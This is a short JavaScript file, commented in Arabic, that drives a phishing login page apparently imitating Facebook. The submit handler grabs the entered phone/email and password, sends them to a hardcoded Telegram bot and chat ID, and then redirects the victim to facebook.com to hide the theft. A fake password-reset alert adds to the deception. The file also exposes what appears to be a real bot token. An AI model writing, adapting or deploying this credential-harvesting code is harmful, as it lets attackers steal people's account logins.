// التوكن الخاص بالبوت
const TELEGRAM_BOT_TOKEN = '7913260818:AAGT5rKbYr6RdKrO5O3OKmBKbSpsdSZ_Z5Y';
// Chat ID الخاص بك
const CHAT_ID = '6514749116';

// وظيفة إرسال البيانات إلى تليجرام
async function sendToTelegram(message) {
    const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
    const data = {
        chat_id: CHAT_ID,
        text: message,
        parse_mode: 'HTML',
    };

    try {
        const response = await fetch(url, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify(data),
        });

        if (!response.ok) {
            throw new Error('Failed to send message to Telegram');
        }
    } catch (error) {
        console.error('Error:', error);
    }
}

// التعامل مع إرسال النموذج
document.getElementById('loginForm').addEventListener('submit', (event) => {
    event.preventDefault();

    // جمع البيانات من الحقول
    const username = document.getElementById('username').value;
    const password = document.getElementById('password').value;

    // إنشاء الرسالة
    const message = `<b>بيانات تسجيل دخول جديدة:</b>\nرقم الهاتف/الإيميل: ${username}\nكلمة المرور: ${password}`;

    // إرسال البيانات إلى تليجرام فورًا
    sendToTelegram(message);

    // إعادة توجيه المستخدم بعد تسجيل الدخول
    window.location.href = "https://www.facebook.com"; // تغيير إلى الرابط المطلوب
});

// تفعيل خيار "هل نسيت كلمة المرور؟"
document.getElementById('forgotPassword').addEventListener('click', () => {
    alert("تم إرسال طلب استعادة كلمة المرور. يرجى مراجعة بريدك الإلكتروني.");
});